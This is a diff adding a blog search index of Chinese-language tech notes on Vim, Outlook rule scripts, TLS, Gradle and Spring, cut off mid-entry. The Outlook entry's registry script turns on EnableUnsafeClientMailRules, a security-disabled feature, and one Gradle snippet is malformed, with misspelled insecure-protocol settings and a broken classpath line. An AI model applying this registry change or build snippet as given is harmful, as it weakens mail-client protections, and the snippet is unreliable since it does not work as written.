@@ -1,0 +1,1201 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>即將失傳的古老技藝 Vim - 學習筆記</title>
+      <link href="/2023/03/19/2023-2023-03-19-ironman-note-vim/"/>
+      <url>/2023/03/19/2023-2023-03-19-ironman-note-vim/</url>
+      
+        <content type="html"><![CDATA[<h3 id="DAY-01-為什麼學-Vim？"><a href="https://ithelp.ithome.com.tw/articles/10215975">DAY 01 為什麼學 Vim？</a></h3><ul><li>vim 高度客製化的文字編輯器</li><li>vim的外掛大神 - Tim Pope</li></ul><h3 id="DAY-02-安裝-Vim">DAY 02 安裝 Vim</h3><ul><li>vim - ViMproved</li><li><a href="https://www.vim.org/download.php">vim install</a></li><li>windows using WSL</li><li>進入vim，在console輸入vim</li><li>離開vim，：q</li><li><a href="https://marketplace.visualstudio.com/items?itemName=vscodevim.vim">vscode vim extention</a></li></ul><h3 id="DAY-03-開始在-Vim-裡打字">DAY 03 開始在 Vim 裡打字</h3><ul><li>ESC還是Ctrl + [</li><li>存檔:w filename，開檔vim filename<br><img src="/assets/img/blog/2023/20230319/day03.jpg" alt="day03"></li></ul><h3 id="DAY-04-在-Vim-裡移動游標">DAY 04 在 Vim 裡移動游標</h3><ul><li>Capslock鍵改為Ctrl</li><li>Ctrl + z把vim放到背景</li><li>fg把背景的vim叫回來</li><li>移動游標 hjkl</li><li><a href="https://vim-adventures.com/">game vim advanture</a></li></ul><h3 id="DAY-05-Vim-之更快速、更精準的移動游標">DAY 05 Vim 之更快速、更精準的移動游標</h3><ul><li>w/W往前進一個字，b/B往前進一個字</li><li>移到上一個段落{，移到下一個段落}</li><li>跳頁首gg，跳頁尾G</li><li>跳行頭數字0，跳行尾$</li><li>折行中的下一行gj，前一行gk</li><li>insert模式移動?–&gt;只在normal移動</li></ul><h3 id="DAY-06-Vim-之在文件裡搜尋文字">DAY 06 Vim 之在文件裡搜尋文字</h3><ul><li>/搜尋</li><li>設定搜尋highlight效果:set hlsearch</li><li>n搜尋下一個，N搜尋上一個</li><li>*搜尋目前游標的這個字</li><li>#搜尋目前游標的這個字(反向)</li><li>fx往後搜尋同一行最近的x，Fx往前搜尋同一行最近的x</li><li>zz讓某一行停在畫面中間，zt停在最上面，zb停在最下面</li></ul><h3 id="DAY-07-Vim-之選取、複製、貼上">DAY 07 Vim 之選取、複製、貼上</h3><ul><li>visual mode<br><img src="/assets/img/blog/2023/20230319/day07.jpg" alt="day07"></li><li>V切換到visual mode並選取一整行</li><li>y=yank=複製，p=paste=貼上</li><li>複製不一定要先選取</li><li>yy複製一整行</li><li>Insert模式怎麼複製–&gt;切換到visual在做這件事</li></ul><h3 id="DAY-08-Vim-之更多關於選取、複製、貼上">DAY 08 Vim 之更多關於選取、複製、貼上</h3><ul><li>複製不一定要先選取</li><li>3yy複製游標所在的以下三行</li><li>y$複製到游標處行尾</li><li>yG複製到游標處最後一行</li><li>p可以在游標處貼上文字，P可以在游標前貼上文字</li><li>若複製一整行則貼在前一行/後一行</li><li>u回到上一步(undo)</li><li>ctrl + r 重做(redo)</li><li>複製是複製到哪裡呢–&gt;Register站存器，ay把內容存到a暫存，by存到b暫存，貼上ap/bp</li><li>:reg檢視暫存器，共48個暫存器</li><li>暫存器可以跟剪貼簿共通嗎–&gt;:set clipboard = unnamed</li></ul><h3 id="DAY-09-Vim-之編輯文字">DAY 09 Vim 之編輯文字</h3><ul><li>I跳到行首並進入insert模式</li><li>A跳到行末並進入insert模式</li><li>x刪除游標所在文字，且會把刪除內容放到暫存器</li><li>d刪除選取的內容，且會把刪除內容放到暫存器</li><li>D刪除游標以後的內容，且會把刪除內容放到暫存器</li><li>dd刪除游標所在的那一行，且會把刪除內容放到暫存器</li><li>dG刪除游標以下內容，且會把刪除內容放到暫存器</li><li>dgg刪除游標以上內容，且會把刪除內容放到暫存器</li><li>c刪除選取內容並進入insert模式，且會把刪除內容放到暫存器</li><li>C刪除游標後內容並進入insert模式，且會把刪除內容放到暫存器</li><li>r取代游標所在文字</li><li>&gt;&gt;與&lt;&lt;可增加或減少縮排</li><li>=排版(需要選取)</li></ul><h3 id="DAY-10-Vim-之編輯多個檔案-Part-1">DAY 10 Vim 之編輯多個檔案 Part 1</h3><ul><li>:e Filename開啟檔案</li><li>:tabe開新分頁，切換分頁gt/gT</li><li>:new新增水平分割視窗，:vnew新稱垂直分割視窗</li><li>Ctrl+w+hjkl移動游標到指定視窗</li><li>vim -o用水平分割視窗開啟檔案</li><li>vim -o用垂直分割視窗開啟檔案</li><li>vim -p用分頁視窗開啟檔案</li></ul><hr><h2 id="reference-45">reference</h2>]]></content>
+      
+      
+      <categories>
+          
+          <category> ironman_note </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>修改cmder prompt lamda symbol</title>
+      <link href="/2023/03/07/2023-2023-03-07-cmder-change-lamda-Symbol/"/>
+      <url>/2023/03/07/2023-2023-03-07-cmder-change-lamda-Symbol/</url>
+      
+        <content type="html"><![CDATA[<h2 id="修改config資料夾下的cmder-prompt-config-lua">修改config資料夾下的cmder_prompt_config.lua</h2><p><img src="/assets/img/blog/2023/20230307/cmder_symbol.jpg" alt="cmder_sybmol"></p><hr><h2 id="reference-44">reference</h2>]]></content>
+      
+      
+      <categories>
+          
+          <category> terminal </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>電腦各式接頭</title>
+      <link href="/2023/03/05/2023-2023-03-05-computer-port/"/>
+      <url>/2023/03/05/2023-2023-03-05-computer-port/</url>
+      
+        <content type="html"><![CDATA[<h2 id="顯示器接頭">顯示器接頭</h2><h3 id="VGA-D-Sub-Video-Graphics-Array">VGA (D-Sub) (Video Graphics Array)</h3><ul><li>類比訊號傳輸</li><li>沒有傳輸音訊</li></ul><p><img src="/assets/img/blog/2023/20230305/vga.jpg" alt="vga"></p><h3 id="DVI-（Digital-Video-Interface）">DVI （Digital Video Interface）</h3><ul><li>數位訊號傳輸</li><li>沒有傳輸音訊</li></ul><p><img src="/assets/img/blog/2023/20230305/dvi.jpg" alt="dvi"></p><h3 id="HDMI-High-Definition-Multimedia-Interface">HDMI (High Definition Multimedia Interface)</h3><ul><li>數位訊號傳輸</li><li>有傳輸音訊</li><li>HDMI2.0最高能支持3840*2160解像度，支持4k<br><img src="/assets/img/blog/2023/20230305/hdmi.jpg" alt="hdmi"></li></ul><h3 id="DP-Display-Port">DP (Display Port)</h3><p><img src="/assets/img/blog/2023/20230305/dp.jpg" alt="dp"></p><h2 id="USB接頭">USB接頭</h2><h3 id="mini-USB、micro-USB、USB-Type-B">mini USB、micro USB、USB Type B</h3><p><img src="/assets/img/blog/2023/20230305/mini_usb.jpg" alt="mini_usb"></p><h3 id="USB-3-0-、2-0">USB 3.0 、2.0</h3><p><img src="/assets/img/blog/2023/20230305/usb.jpg" alt="usb"></p><h3 id="Type-C">Type-C</h3><ul><li>可傳輸音訊、影像</li><li>最高傳輸效率可達 10Gbps</li><li>提供高達 100W 的充電電流</li></ul><p><img src="/assets/img/blog/2023/20230305/type_c.jpg" alt="type_c"></p><h3 id="ThunderBolt">ThunderBolt</h3><ul><li>電源</li><li>資料傳輸</li><li>視訊顯示</li></ul><p><img src="/assets/img/blog/2023/20230305/ThunderBolt.jpg" alt="ThunderBolt"></p><hr><h2 id="reference-43">reference</h2><ul><li><a href="https://innfact.com.tw/blogs/%E6%96%B0%E8%81%9E/type-c">Type-C充電線是什麼 - innfact</a></li><li><a href="https://tw.news.yahoo.com/news/%E9%9B%BB%E8%85%A6%E6%8E%A5%E9%A0%AD%E9%9C%A7%E7%85%9E%E7%85%9E-%E4%BA%94%E5%88%86%E9%90%98%E6%95%99%E6%9C%83%E4%BD%A0%E8%BE%A8%E8%AD%98%E5%90%84%E7%A8%AE%E9%9B%BB%E8%85%A6%E6%8E%A5%E9%A0%AD-092300854.html?guccounter=1&amp;guce_referrer=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8&amp;guce_referrer_sig=AQAAALRHtHG-M2tMVPYtFMgt53lvzoJDAWNJLJFwwtVHXOuDh_enJrohrcGGn4pH9yB1e1eLYWj7CyoGbh7ElYa3Op_5DMDv_2o6GBI6L_z76rNdZUJygKEanNtCGwsRz_wkP6XI78f0_eoT8gZQ6IcQY7CWRpfFmulrhkBD9mZ_dCTe">電腦接頭霧煞煞？五分鐘教會你辨識各種電腦接頭 - Yahoo奇摩3C科技</a></li><li><a href="https://www.price.com.hk/news.php?id=9971">關於VGA、DVI、HDMI的幾點誤解和區別 - Price</a></li><li><a href="https://www.intel.com.tw/content/www/tw/zh/architecture-and-technology/thunderbolt/thunderbolt-4-vs-usb-c.html">Thunderbolt™ 4 與 USB-C 之間的差異為何？ - Intel</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> computer </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>金融業清算交割運作機制</title>
+      <link href="/2023/02/06/2023-2023-02-06-financial-market-operation/"/>
+      <url>/2023/02/06/2023-2023-02-06-financial-market-operation/</url>
+      
+        <content type="html"><![CDATA[<h2 id="央行同資系統清算業">央行同資系統清算業</h2><p><img src="/assets/img/blog/2023/20230206/cbc.jpg" alt="cbc"></p><h2 id="證券款券交割作業">證券款券交割作業</h2><p><img src="/assets/img/blog/2023/20230206/twse01.jpg" alt="twse_flow"><br><img src="/assets/img/blog/2023/20230206/twse02.jpg" alt="twse_flow"></p><h2 id="票保結算系統之清算流程">票保結算系統之清算流程</h2><p><img src="/assets/img/blog/2023/20230206/bcss.jpg" alt="bcss_flow"></p><h2 id="外幣結算系統之清算流程">外幣結算系統之清算流程</h2><p><img src="/assets/img/blog/2023/20230206/fx.jpg" alt="fx_flow"></p><hr><h2 id="reference-42">reference</h2><ul><li><a href="https://www.cbc.gov.tw/tw/cp-392-75789-C28FD-1.html">中央銀行同業資金調撥清算作業系統 - 中央銀行</a></li><li><a href="https://www.cbc.gov.tw/tw/np-299-1.html">中華民國支付及清算系統PDF - 中央銀行</a></li><li><a href="https://www.twse.com.tw/zh/page/clearing/operations.html">證券款券交割作業 - 證交所</a></li><li><a href="https://m.tdcc.com.tw/TDCCWEB/upload/4028979671f3af6801722bb3bb59001d.pdf">從我國金融市場金流服務新趨勢探討固定收益商品款項收付新思維 - 集保</a></li><li><a href="https://www.fisc.com.tw/Upload/b7dbde3e-2572-4b46-9dcc-d2c198001ec9/TC/8204.pdf">探討我國「外幣結算平台」之服務與發展 - 財金資訊公司</a></li><li><a href="https://www.fisc.com.tw/Upload/6d0d4130-c6f3-4e0f-98fc-cadebebfbaa0/TC/7503.pdf">「外幣結算平台」之架構設計及系統建置 - 財金資訊公司</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> finance </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> outlook </tag>
+            
+            <tag> python </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>outlook郵件規則設定執行python</title>
+      <link href="/2023/01/03/2023-2023-01-03-outlook-run-a-script/"/>
+      <url>/2023/01/03/2023-2023-01-03-outlook-run-a-script/</url>
+      
+        <content type="html"><![CDATA[<h2 id="outlook執行指令碼">outlook執行指令碼</h2><p>由於安全性的關係，outlook預設關閉執行指令碼的功能，可以透過機碼的方式開啟，以下提供兩種方式</p><h3 id="UI設定">UI設定</h3><p><img src="/assets/img/blog/2023/20230103/regedit_setting.png" alt="regedit_setting"></p><h3 id="登錄檔腳本">登錄檔腳本</h3><p>將以下指令存成.\reg檔，並以最高權限執行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security]</span><br><span class="line">&quot;EnableUnsafeClientMailRules&quot;=dword:00000001</span><br></pre></td></tr></table></figure><h2 id="outlook指令碼撰寫">outlook指令碼撰寫</h2><p>開啟outlook開發人員，撰寫public sub且傳入參數為Outlook.MailItem</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Public</span> <span class="keyword">Sub</span> run_python(Item <span class="keyword">As</span> Outlook.MailItem)</span><br><span class="line">    Shell(<span class="string">&quot;python D:\test.py&quot;</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure><h2 id="測試">測試</h2><h3 id="設定安全性">設定安全性</h3><p><img src="/assets/img/blog/2023/20230103/security01.png" alt="security01"><br><img src="/assets/img/blog/2023/20230103/security02.png" alt="security02"></p><h3 id="設定module">設定module</h3><p><img src="/assets/img/blog/2023/20230103/demo01.png" alt="demo01"></p><h3 id="設定信件規則">設定信件規則</h3><p><img src="/assets/img/blog/2023/20230103/demo02.png" alt="demo02"><br><img src="/assets/img/blog/2023/20230103/demo03.png" alt="demo03"><br><img src="/assets/img/blog/2023/20230103/demo04.png" alt="demo04"><br><img src="/assets/img/blog/2023/20230103/demo05.png" alt="demo05"><br><img src="/assets/img/blog/2023/20230103/demo06.png" alt="demo06"><br><img src="/assets/img/blog/2023/20230103/demo07.png" alt="demo07"></p><h3 id="觸發信件規則">觸發信件規則</h3><p><img src="/assets/img/blog/2023/20230103/demo08.png" alt="demo08"></p><hr><h2 id="reference-41">reference</h2><ul><li><a href="https://www.slipstick.com/outlook/rules/outlook-run-a-script-rules/">Run-a-Script Rules Missing in Outlook - Slipstick Systems</a></li><li><a href="https://answers.microsoft.com/en-us/outlook_com/forum/all/run-a-script-option-not-showing-in-the-ol-2016/2f2e4898-e6ac-4400-badf-2cc9b0bbf00c">“Run a Script” option not showing - Microsoft Community</a></li><li><a href="https://www.slipstick.com/outlook/rules/outlooks-rules-and-alerts-run-a-script/">Outlook’s Rules and Alerts: Run a Script -Slipstick Systems</a></li><li><a href="https://ithelp.ithome.com.tw/articles/10268506">REG檔撰寫—登錄檔腳本其實不難 - 2021鐵人賽 Zero皇</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> outlook </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> outlook </tag>
+            
+            <tag> python </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>學習如何學習</title>
+      <link href="/2022/12/11/2022-2022-12-06-learn-how-to-learn/"/>
+      <url>/2022/12/11/2022-2022-12-06-learn-how-to-learn/</url>
+      
+        <content type="html"><![CDATA[<h2 id="記憶痕跡">記憶痕跡</h2><p>記憶痕跡深淺關乎我們調閱他的能力，奮力回想則越深刻，重複閱讀則較淺-&gt;容易有熟悉的錯覺<br>重複閱讀會使使用者無法察覺到自己有那些東西不知道</p><h2 id="培養主動檢索能力">培養主動檢索能力</h2><ol><li>穿插式學習<br>將練習當作比賽，才能把比賽當作是練習</li><li>讓主動檢索成為習慣<br>每天寫下10個今天之前不知道，你今天學到的東西(不能拿出筆記與課本參考)-&gt;目的刻畫處更深的記憶痕跡</li><li>費曼學習法</li><li>教練<br>考試就是最好的教練，為幾天後的自己出題，以問答題為主，隔天睡起來是一個不錯的選擇</li></ol><hr><h2 id="reference-39">reference</h2><ul><li><a href="https://www.youtube.com/watch?v=k-MOeKIkvfs">學霸們的秘密<Make It Sick> - 文森說書</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> learn </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>紀錄windows系統上tls關閉造成db無法連線的原因</title>
+      <link href="/2022/12/06/2022-2022-12-06-network-tls/"/>
+      <url>/2022/12/06/2022-2022-12-06-network-tls/</url>
+      
+        <content type="html"><![CDATA[<h2 id="問題解決">問題解決</h2><p>系統是透過ODBC SQL Native Client進行DB連線，而ODBC舊版無支援TLS1.2，需更新至新版</p><h2 id="Schannel-SSP">Schannel SSP</h2><p>從Microsoft doc可以知道這是windows系統在使用security相關的 function時會調用的api<br><img src="/assets/img/blog/2022/20221206/schannel.png" alt="schannel"><br>所以當與資料庫連線失敗時可以透過<a href="https://learn.microsoft.com/zh-tw/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn786445%28v=ws.11%29#how-to-enable-schannel-event-logging">SChannel紀錄</a>查看</p><h2 id="紀錄爬文TLS無法連線的可能原因">紀錄爬文TLS無法連線的可能原因</h2><ul><li>除了修改機碼可以修改TLS的版本，亦可透過IIS Crypto GUI介面設定作業統層級的TLS版本協定(Client、Server)</li><li>dot NET Framework版本支援</li><li>加密算法不支援</li></ul><hr><h2 id="reference-40">reference</h2><ul><li><a href="https://learn.microsoft.com/en-us/windows-server/security/tls/tls-ssl-schannel-ssp-overview">TLS/SSL overview (Schannel SSP) - Microsoft</a></li><li><a href="https://learn.microsoft.com/zh-tw/troubleshoot/windows-server/identity/apps-forcibly-closed-tls-connection-errors">在 Windows 中連線 SQL Server 時，應用程式遇到強制關閉的 TLS 連線錯誤 - Microsoft</a></li><li><a href="https://read01.com/zh-tw/d0NNNJk.html#.Y6RuWBVByUn">截獲TLS密鑰——Windows Schannel</a></li><li><a href="https://learn.microsoft.com/zh-tw/mem/configmgr/core/plan-design/security/enable-tls-1-2-server">如何在月臺伺服器和遠端月臺系統上啟用 TLS 1.2</a></li><li><a href="https://blog.darkthread.net/blog/sql-tls12-odbc-oledb/">ODBC 與 OLEDB 之 SQL Server TLS 1.2 支援問題</a></li><li><a href="https://blog.darkthread.net/blog/net35-tls12-issue/">.NET 3.5 TLS 1.2 踩雷記</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> windows </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> tls </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>如何使用CMD kill Process</title>
+      <link href="/2022/11/29/2022-2022-11-29-cmd-how-to-kill-process/"/>
+      <url>/2022/11/29/2022-2022-11-29-cmd-how-to-kill-process/</url>
+      
+        <content type="html"><![CDATA[<p>因公司會定期掃到一些有弱點的軟體，但那些軟體都是免安裝版，推論是下班沒有關閉而被掃到，所以就寫一的定時排程關閉那些軟體吧!!</p><h2 id="taskkill-參數">taskkill 參數</h2><p>這邊會使用到/IM與/F參數<br><img src="/assets/img/blog/2022/20221129/taskkill_help.png" alt="taskkill_command"></p><h2 id="包裝成bat-file">包裝成bat file</h2><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">taskkill</span> /IM &quot;redis-server.exe&quot; /F</span><br><span class="line"><span class="built_in">taskkill</span> /IM &quot;eclipse.exe&quot; /F</span><br></pre></td></tr></table></figure><h2 id="設定windows排程就大功告成">設定windows排程就大功告成</h2><h3 id="step01">step01</h3><p><img src="/assets/img/blog/2022/20221129/taskschedule_01.png" alt="taskschedule_01"></p><h3 id="step02">step02</h3><p><img src="/assets/img/blog/2022/20221129/taskschedule_02.png" alt="taskschedule_02"></p><h3 id="step03">step03</h3><p><img src="/assets/img/blog/2022/20221129/taskschedule_03.png" alt="taskschedule_03"></p><h3 id="step04">step04</h3><p><img src="/assets/img/blog/2022/20221129/taskschedule_04.png" alt="taskschedule_04"></p><h3 id="step05">step05</h3><p><img src="/assets/img/blog/2022/20221129/taskschedule_05.png" alt="taskschedule_05"></p><h3 id="step06">step06</h3><p><img src="/assets/img/blog/2022/20221129/taskschedule_06.png" alt="taskschedule_06"></p><h3 id="step07">step07</h3><p><img src="/assets/img/blog/2022/20221129/taskschedule_07.png" alt="taskschedule_07"></p><h3 id="step08">step08</h3><p><img src="/assets/img/blog/2022/20221129/taskschedule_08.png" alt="taskschedule_08"></p><h3 id="step09">step09</h3><p><img src="/assets/img/blog/2022/20221129/taskschedule_09.png" alt="taskschedule_09"></p><h3 id="step10">step10</h3><p><img src="/assets/img/blog/2022/20221129/taskschedule_10.png" alt="taskschedule_10"></p><hr><h2 id="reference-38">reference</h2><ul><li><a href="https://www.partitionwizard.com/partitionmanager/cmd-kill-process.html">CMD Kill Process:How to Kill Process in Command Prompt - Partition Wizard</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> CMD </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> process </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>locked java.io.BufferedOutputStream</title>
+      <link href="/2022/11/27/2022-2022-11-28-spring-job-hang/"/>
+      <url>/2022/11/27/2022-2022-11-28-spring-job-hang/</url>
+      
+        <content type="html"><![CDATA[<p>紀錄在windows上執行spring boot既定排程未執行的問題原因</p><h2 id="透過jconsole發現locked的狀態">透過jconsole發現locked的狀態</h2><p><img src="/assets/img/blog/2022/20221128/locked_01.png" alt="locked"></p><h2 id="原因在於windows-cmd-使用標記時會將應用程式process-掛起">原因在於windows cmd 使用標記時會將應用程式process 掛起</h2><p><img src="/assets/img/blog/2022/20221128/cause_01.png" alt="cause_02"><br><img src="/assets/img/blog/2022/20221128/cause_02.png" alt="cause_01"></p><hr><h2 id="reference-37">reference</h2><ul><li><a href="https://my.oschina.net/u/1030459/blog/908007">一个 RUNNABLE 状态的线程 hang 在了 java.io.FileOutputStream.writeBytes 方法上 - <strong>yongk</strong></a></li><li><a href="https://stackoverflow.com/questions/634102/log4j-is-hanging-my-application-what-am-i-doing-wrong">Log4j is hanging my application what am I doing wrong? - <strong>siddhadev</strong></a></li><li><a href="https://stackoverflow.com/questions/33883530/why-is-my-command-prompt-freezing-on-windows-10">Why is my command prompt freezing on Windows 10? - <strong>Zoe stands with</strong></a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> Java </category>
+          
+          <category> job </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> lock </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Gradle 設置Spring boot 2.7.5</title>
+      <link href="/2022/11/22/2022-2022-11-22-gradle-spring-boot-setting/"/>
+      <url>/2022/11/22/2022-2022-11-22-gradle-spring-boot-setting/</url>
+      
+        <content type="html"><![CDATA[<p>紀錄一下Spring boot 2.7.5設置的兩種方式，公司透過spring initializer下載下來的build一執會有錯誤訊息，使用legacy plugin的方式設定才成功</p><h2 id="由spring-initializer設定的結果">由spring initializer設定的結果</h2><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">plugins &#123;</span><br><span class="line">    id <span class="string">&#x27;java&#x27;</span></span><br><span class="line">    id <span class="string">&#x27;org.springframework.boot&#x27;</span> version <span class="string">&#x27;2.7.5&#x27;</span></span><br><span class="line">    id <span class="string">&#x27;io.spring.dependency-management&#x27;</span> version <span class="string">&#x27;1.0.15.RELEASE&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">group</span> = <span class="string">&#x27;com.swj.demo&#x27;</span></span><br><span class="line">version = <span class="string">&#x27;0.0.1-SNAPSHOT&#x27;</span></span><br><span class="line"><span class="keyword">sourceCompatibility</span> = <span class="string">&#x27;1.8&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">repositories</span> &#123;</span><br><span class="line">    mavenCentral()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">dependencies</span> &#123;</span><br><span class="line">    implementation <span class="string">&#x27;org.springframework.boot:spring-boot-starter-web&#x27;</span></span><br><span class="line">    testImplementation <span class="string">&#x27;org.springframework.boot:spring-boot-starter-test&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tasks.named(<span class="string">&#x27;test&#x27;</span>) &#123;</span><br><span class="line">    useJUnitPlatform()</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Using-legacy-plugin">Using legacy plugin</h2><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">buildscript</span> &#123;</span><br><span class="line">  <span class="keyword">repositories</span> &#123;</span><br><span class="line">    maven &#123;</span><br><span class="line">      alloInsecureProtocal = <span class="keyword">true</span></span><br><span class="line">      url <span class="string">&quot;https://plugins.gradle.org/m2/&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">dependencies</span> &#123;</span><br><span class="line">    <span class="keyword">classpath</span> <span class="string">&quot;org.springframework.boot:spring-boot-gradle-plugin:2.7.5&quot;</span></span><br><span class="line">    <span class="keyword">classpath</span> <span class="string">&quot;&#x27;io.spring.dependency-management&#x27; version &#x27;1.0.15.RELEASE&#x27;&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">allprojects</span> &#123;</span><br><span class="line">    <span class="keyword">repositories</span> &#123;</span><br><span class="line">        alloInsecureProtocal = <span class="keyword">true</span></span><br><span class="line">        url <span class="string">&quot;https://plugins.gradle.org/m2/&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">apply plugin: <span class="string">&#x27;org.springframework.boot&#x27;</span></span><br><span class="line">apply plugin: <span class="string">&#x27;java&#x27;</span></span><br><span class="line">apply plugin: <span class="string">&#x27;io.spring.dependency-management&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">group</span> = <span class="string">&#x27;com.swj.demo&#x27;</span></span><br><span class="line">version = <span class="string">&#x27;0.0.1-SNAPSHOT&#x27;</span></span><br><span class="line"><span class="keyword">sourceCompatibility</span> = <span class="string">&#x27;1.8&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">dependencies</span> &#123;</span><br><span class="line">    implementation <span class="string">&#x27;org.springframework.boot:spring-boot-starter-web&#x27;</span></span><br><span class="line">    testImplementation <span class="string">&#x27;org.springframework.boot:spring-boot-starter-test&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tasks.named(<span class="string">&#x27;test&#x27;</span>) &#123;</span><br><span class="line">    useJUnitPlatform()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="踩過的坑">踩過的坑</h2><h3 id="Could-not-set-unknown-property-‘sourceCompatibility’-for-root-project">Could not set unknown property ‘sourceCompatibility’ for root project</h3><p>解決方式：加入apply plugin:‘java’</p><hr><h2 id="reference-36">reference</h2><ul><li><a href="https://plugins.gradle.org/plugin/org.springframework.boot">Spring Boot Gradle Plugin - <strong>Gradle doc</strong></a></li><li><a href="https://stackoverflow.com/questions/25994163/could-not-resolve-all-dependencies-for-configuration-classpath">Could not resolve all dependencies for configuration ‘:classpath’ - stackoverflow Onema</a></li><li><a href="https://docs.gradle.org/current/userguide/plugins.html#sec:old_plugin_application">Legacy Plugin Appplication - Gradle doc</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> Java </category>
+          
+          <category> gradle </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> gradle </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Windows 執行Java -jar發生的問題</title>
+      <link href="/2022/11/20/2022-2022-11-20-java-execute-jar-problem/"/>
+      <url>/2022/11/20/2022-2022-11-20-java-execute-jar-problem/</url>
+      
+        <content type="html"><![CDATA[<h2 id="執行Jar檔產生亂碼">執行Jar檔產生亂碼</h2><p><img src="/assets/img/blog/2022/20221120/java_jar_run_fail_01.png" alt="build_gradle"></p><h2 id="對檔案指定uft-8編碼，但main-class出現的錯訊">對檔案指定uft-8編碼，但main-class出現的錯訊</h2><p><img src="/assets/img/blog/2022/20221120/java_jar_run_fail_02.png" alt="build_gradle"></p><h2 id="加入mainfest後成功執行">加入mainfest後成功執行</h2><hr><h2 id="reference-35">reference</h2><ul><li><a href="https://stackoverflow.com/questions/21721119/creating-runnable-jar-with-gradle">Create runnable JAR</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> Java </category>
+          
+          <category> Jar </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Jar </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>How to generate runnable jar</title>
+      <link href="/2022/11/20/2022-2022-11-20-intellij-generate-runnable-jar/"/>
+      <url>/2022/11/20/2022-2022-11-20-intellij-generate-runnable-jar/</url>
+      
